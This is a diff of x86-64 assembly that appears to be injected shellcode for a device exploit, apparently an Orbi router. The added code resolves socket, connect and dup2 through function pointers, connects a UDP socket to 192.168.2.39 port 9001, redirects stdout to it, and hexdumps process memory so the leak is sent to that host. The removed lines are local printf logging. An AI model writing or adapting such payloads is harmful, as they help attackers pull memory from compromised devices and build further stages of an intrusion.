@@ -143,10 +143,8 @@ lock cmpxchg dword ptr [rbx], ecx
 jz first_run
 
 #if the printer has been sucessfully initialized
-    cmp eax, 1
-    jz printf_the_stuff
 
-jmp result_sucess
+jmp result_error
 
 first_run:
 
@@ -199,19 +197,74 @@ first_run:
 
 doprinttext pttextout_got_socket34 "all lib calls resolved\n"
 
-popstring rdi someflag "%llx: %llx\n"
-mov rsi, qword ptr [r14 + 0x10]
-add rsi, 0x892868
-mov rdx, rsi
 
-xor eax, eax
-call [rbp - 0x248]
 
-mov rsi, qword ptr [r14 + 0x10]
-add rsi, 0x892868
-mov rdi, rsi
 
-call hexdump
+
+
+#socket
+    mov     edx, 0          # protocol
+    mov     esi, 2          # type, TCP = 1 UDP = 2
+    mov     edi, 2          # domain
+    call    [r15 - 0x190] #socket
+
+    mov     [r15 - 0x218], eax
+    cmp     dword ptr [r15 - 0x218], 0
+    js     result_error
+
+#init address struct and connect
+    lea     rdi, [rbp+0x10]
+    mov qword ptr [rdi], 0
+    mov qword ptr [rdi+8], 0
+
+    mov     byte ptr [rbp-15], 2
+    mov     word ptr [rbp-14], 0x2923
+    mov     dword ptr [rbp-12], 0x2702A8C0
+    lea     rsi, [rbp-0x10]  # addr
+    mov     edx, 0x10        # len
+    mov     edi, [r15 - 0x218] # fd
+    call    [r15 - 0x198] #connect
+
+    test    eax, eax
+    js     result_error
+
+
+#dup2 the socket to STDOUT
+    mov rdi, [r15 - 0x218]
+    mov rsi, 1 #STDOUT_FILENO
+    call [rbp - 0x240]
+
+
+
+
+
+# popstring rdi someflag "%llx: %llx\n"
+# mov rsi, qword ptr [r14 + 0x10]
+# add rsi, 0x892868
+# mov rdx, rsi
+
+# xor eax, eax
+# call [rbp - 0x248]
+
+mov rbx, 0
+lol:
+
+mov rdi, [r14+0x10]
+add rdi, 0x892868
+add rdi, rbx
+mov rdi, [rdi]
+
+call primitive_hexdump
+
+add rbx, 8
+
+doprinttext anewline "\n"
+
+cmp rbx, 0x40
+jb lol
+
+
+
 
 mov eax, 0 #initial second value
 mov rbx, [r14]
@@ -234,64 +287,6 @@ result_sucess:
 test eax,eax
 jnz skip_printf
 
-#the libc->printf has to be resolved on each call to the logger
-#as the context gets lost
-call populate_libc
-
-#print some address in hex, one time via cmpxchg
-    #mov eax, 0x4942524f #initial value 'ORBI'
-    mov eax, 0 #initial value 'ORBI'
-    mov rbx, [r14]
-    mov ecx, 1 #new value
-    lock cmpxchg dword ptr [rbx+8], ecx
-    jnz dontprint_hex
-
-    mov rdi, [r14+0x10]
-    add rdi, 0x8925d0
-    mov rdi, [rdi]
-
-    call primitive_hexdump
-
-    dontprint_hex:
-
-
-#printf the caller address
-    call somestr
-    .asciz "%016llX\n"
-    somestr:
-    pop rdi
-
-    mov rsi, [rbp + 8]
-    mov rax, [r14 + 0x10]
-    sub rsi, rax
-
-    call [rbp - 0x248]
-
-mov r15, qword ptr [rbp - 0x90]
-mov r14, qword ptr [rbp - 0x98]
-mov r13, qword ptr [rbp - 0x100]
-mov r12, qword ptr [rbp - 0x108]
-mov r11, qword ptr [rbp - 0x110]
-mov r10, qword ptr [rbp - 0x118]
-mov r9, qword ptr [rbp - 0x120]
-mov r8, qword ptr [rbp - 0x128]
-mov rcx, qword ptr [rbp - 0x130]
-mov rdx, qword ptr [rbp - 0x138]
-mov rsi, qword ptr [rbp - 0x140]
-mov rdi, qword ptr [rbp - 0x148]
-mov rbx, qword ptr [rbp - 0x150]
-
-movdqu xmm7, xmmword ptr [rbp - 0x10]
-movdqu xmm6, xmmword ptr [rbp - 0x20]
-movdqu xmm5, xmmword ptr [rbp - 0x30] 
-movdqu xmm4, xmmword ptr [rbp - 0x40] 
-movdqu xmm3, xmmword ptr [rbp - 0x50] 
-movdqu xmm2, xmmword ptr [rbp - 0x60] 
-movdqu xmm1, xmmword ptr [rbp - 0x70] 
-movdqu xmm0, xmmword ptr [rbp - 0x80] 
-
-#do printf
-call [rbp - 0x248]
 
 skip_printf:
 
